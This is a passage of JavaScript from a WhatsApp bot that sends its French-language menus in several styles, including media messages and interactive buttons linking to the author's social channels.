                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"Cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'autre_menu': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${othermenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"Cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu_telechargement': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${downloadmenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFike/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"Cliquer pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu_groupe': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${groupmenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFike/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
